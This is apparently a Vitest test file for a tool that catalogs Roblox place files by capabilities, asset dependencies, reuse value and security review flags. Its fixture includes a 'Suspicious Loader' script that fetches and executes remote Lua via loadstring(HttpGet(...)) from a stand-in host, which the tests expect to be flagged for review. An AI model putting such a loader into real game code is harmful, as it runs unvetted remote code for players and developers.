
import { describe,expect,it } from 'vitest';
import {
  buildRobloxCapabilityCatalog,
  verifyRobloxCapabilityCatalog
} from './capabilityCatalog.js';
import { capabilityCatalogMarkdown } from './catalogReport.js';

function fixtureDom(){
  return {
    referent:'referent-0',
    name:'DataModel',
    class:'DataModel',
    properties:{},
    children:[
      {
        referent:'referent-1',
        name:'Brookhaven House System',
        class:'Model',
        properties:{},
        children:[
          {
            referent:'referent-2',
            name:'GarageDoor',
            class:'Part',
            properties:{
              TextureID:{Content:{uri:'rbxassetid://123456789'}}
            },
            children:[]
          },
          {
            referent:'referent-3',
            name:'OpenGarage',
            class:'RemoteEvent',
            properties:{},
            children:[]
          },
          {
            referent:'referent-4',
            name:'HouseServer',
            class:'Script',
            properties:{
              Source:{
                String:[
                  'local DataStoreService = game:GetService("DataStoreService")',
                  'local MarketplaceService = game:GetService("MarketplaceService")',
                  'local ReplicatedStorage = game:GetService("ReplicatedStorage")',
                  'local remote = ReplicatedStorage:WaitForChild("OpenGarage")',
                  'local placement = require(987654321)',
                  'remote.OnServerEvent:Connect(function(player, houseId)',
                  '  DataStoreService:GetDataStore("Homes"):UpdateAsync(tostring(houseId), function(old) return old end)',
                  '  MarketplaceService:UserOwnsGamePassAsync(player.UserId, 123456789)',
                  'end)'
                ].join('\n')
              }
            },
            children:[]
          },
          {
            referent:'referent-5',
            name:'Family SUV',
            class:'Model',
            properties:{},
            children:[
              {
                referent:'referent-6',
                name:'DriverSeat',
                class:'VehicleSeat',
                properties:{},
                children:[]
              }
            ]
          }
        ]
      },
      {
        referent:'referent-7',
        name:'Quest HUD',
        class:'ScreenGui',
        properties:{},
        children:[
          {
            referent:'referent-8',
            name:'MissionText',
            class:'TextLabel',
            properties:{},
            children:[]
          }
        ]
      },
      {
        referent:'referent-9',
        name:'Suspicious Loader',
        class:'ModuleScript',
        properties:{
          Source:{String:'return loadstring(game:HttpGet("https://example.invalid/module.lua"))()'}
        },
        children:[]
      }
    ]
  };
}

describe('Roblox / Brookhaven capability catalog', () => {
  it('classifies reusable systems, Roblox capabilities and exact asset dependencies', () => {
    const catalog=buildRobloxCapabilityCatalog([
      {
        sourceId:'brookhaven:main-place',
        file:'Brookhaven.rbxl',
        dom:fixtureDom()
      }
    ]);

    expect(verifyRobloxCapabilityCatalog(catalog)).toEqual({ok:true,errors:[]});
    expect(catalog.summary.sourceCount).toBe(1);
    expect(catalog.summary.instanceCount).toBe(10);
    expect(catalog.summary.scriptCount).toBe(2);
    expect(catalog.summary.remoteCount).toBe(1);

    expect(catalog.capabilities.housing.count).toBeGreaterThan(0);
    expect(catalog.capabilities.vehicles.count).toBeGreaterThan(0);
    expect(catalog.capabilities.ui.count).toBeGreaterThan(0);
    expect(catalog.capabilities.networking.count).toBeGreaterThan(0);
    expect(catalog.capabilities.persistence.count).toBeGreaterThan(0);
    expect(catalog.capabilities.monetization.count).toBeGreaterThan(0);

    expect(catalog.assets.map(item => item.assetId)).toEqual(
      expect.arrayContaining(['123456789','987654321'])
    );

    expect(catalog.dependencies).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type:'service',
          to:'DataStoreService'
        }),
        expect.objectContaining({
          type:'service',
          to:'MarketplaceService'
        }),
        expect.objectContaining({
          type:'remote-reference',
          to:'OpenGarage'
        }),
        expect.objectContaining({
          type:'require-asset',
          to:'987654321'
        })
      ])
    );
  });

  it('captures serialized instance references, asset edges and parent relationships', () => {
    const dom={
      referent:'referent-0',
      name:'DataModel',
      class:'DataModel',
      properties:{},
      children:[
        {
          referent:'referent-1',
          name:'TargetPart',
          class:'Part',
          properties:{
            TextureID:{Content:{uri:'rbxassetid://555555555'}}
          },
          children:[]
        },
        {
          referent:'referent-2',
          name:'TargetLink',
          class:'ObjectValue',
          properties:{Value:'referent-1'},
          children:[]
        }
      ]
    };

    const catalog=buildRobloxCapabilityCatalog([
      {sourceId:'licensed:refs',file:'Refs.rbxmx',dom}
    ]);

    expect(catalog.dependencies).toEqual(expect.arrayContaining([
      expect.objectContaining({
        from:'DataModel/TargetPart',
        type:'parent',
        to:'DataModel'
      }),
      expect.objectContaining({
        from:'DataModel/TargetPart',
        type:'asset-reference',
        to:'555555555'
      }),
      expect.objectContaining({
        from:'DataModel/TargetLink',
        type:'property-reference',
        property:'Value',
        to:'DataModel/TargetPart'
      })
    ]));
  });

  it('stores script fingerprints and dependency metadata without retaining source text', () => {
    const catalog=buildRobloxCapabilityCatalog([
      {sourceId:'licensed:place',file:'Place.rbxlx',dom:fixtureDom()}
    ]);

    const script=catalog.instances.find(item => item.name === 'HouseServer');
    expect(script.script.sourceHash).toMatch(/^fnv1a32:[a-f0-9]{8}$/);
    expect(script.script.sourceBytes).toBeGreaterThan(100);
    expect(script.script.services).toContain('DataStoreService');
    expect(script.script).not.toHaveProperty('source');

    const serialized=JSON.stringify(catalog);
    expect(serialized).not.toContain('UserOwnsGamePassAsync(player.UserId');
    expect(serialized).not.toContain('GetDataStore("Homes")');
  });

  it('keeps reuse value separate from security/provenance review state', () => {
    const catalog=buildRobloxCapabilityCatalog([
      {sourceId:'licensed:place',file:'Place.rbxlx',dom:fixtureDom()}
    ]);

    const loader=catalog.instances.find(item => item.name === 'Suspicious Loader');
    expect(loader.reuse.class).toBe('refactor');
    expect(loader.review.required).toBe(true);
    expect(loader.review.reasons).toContain('dynamic-code');
    expect(loader.script.riskFlags).toContain('dynamic-code');
    expect(catalog.summary.reviewRequiredCount).toBeGreaterThan(0);
  });

  it('uses exactly the four migration-value classes and marks unrecognized noise irrelevant', () => {
    const dom=fixtureDom();
    dom.children.push({
      referent:'referent-10',
      name:'SchemaVersionMarker',
      class:'IntValue',
      properties:{Value:{Int32:1}},
      children:[]
    });

    const catalog=buildRobloxCapabilityCatalog([
      {sourceId:'licensed:place',file:'Place.rbxlx',dom}
    ]);

    expect(Object.keys(catalog.reuseCounts).sort()).toEqual(
      ['asset-only','direct','irrelevant','refactor'].sort()
    );
    expect(catalog.instances.find(item => item.name === 'SchemaVersionMarker').reuse.class)
      .toBe('irrelevant');
  });

  it('groups top-level systems and prioritizes implementation-dense candidates', () => {
    const catalog=buildRobloxCapabilityCatalog([
      {sourceId:'licensed:place',file:'Place.rbxlx',dom:fixtureDom()}
    ]);

    const house=catalog.systemCandidates.find(item => item.name === 'Brookhaven House System');
    expect(house).toBeTruthy();
    expect(house.instanceCount).toBeGreaterThanOrEqual(6);
    expect(house.scriptCount).toBe(1);
    expect(house.remoteCount).toBe(1);
    expect(house.capabilities).toEqual(
      expect.arrayContaining(['housing','vehicles','networking','persistence','monetization'])
    );
    expect(house.reuseRecommendation).toBe('refactor');
    expect(house.reviewRequired).toBe(true);
    expect(house.riskFlags).toContain('external-module-require');
    expect(house.engineeringLeverageScore).toBeGreaterThan(5);
  });

  it('binds source provenance to exact file fingerprints when provided', () => {
    const sha256='a'.repeat(64);
    const catalog=buildRobloxCapabilityCatalog([
      {
        sourceId:'licensed:place',
        file:'Place.rbxl',
        sha256,
        bytes:12345,
        dom:fixtureDom()
      }
    ]);

    expect(catalog.generatedFrom).toEqual([{
      sourceId:'licensed:place',
      file:'Place.rbxl',
      sha256,
      bytes:12345
    }]);
    expect(catalog.summary.sourceFingerprintCount).toBe(1);
  });

  it('is deterministic regardless of source ordering', () => {
    const a={sourceId:'b',file:'B.rbxlx',dom:fixtureDom()};
    const b={sourceId:'a',file:'A.rbxlx',dom:fixtureDom()};

    const first=buildRobloxCapabilityCatalog([a,b]);
    const second=buildRobloxCapabilityCatalog([b,a]);

    expect(second).toEqual(first);
  });

  it('detects catalog tampering', () => {
    const catalog=JSON.parse(JSON.stringify(buildRobloxCapabilityCatalog([
      {sourceId:'licensed:place',file:'Place.rbxlx',dom:fixtureDom()}
    ])));

    catalog.summary.scriptCount=999;
    const validation=verifyRobloxCapabilityCatalog(catalog);
    expect(validation.ok).toBe(false);
    expect(validation.errors).toContain('catalog hash mismatch');
  });

  it('renders a compact human review report', () => {
    const catalog=buildRobloxCapabilityCatalog([
      {sourceId:'licensed:place',file:'Place.rbxlx',dom:fixtureDom()}
    ]);
    const report=capabilityCatalogMarkdown(catalog);

    expect(report).toMatch(/Brookhaven House System/);
    expect(report).toMatch(/Highest-leverage system candidates/);
    expect(report).toMatch(/housing/);
    expect(report).toContain(catalog.catalogHash);
  });
});
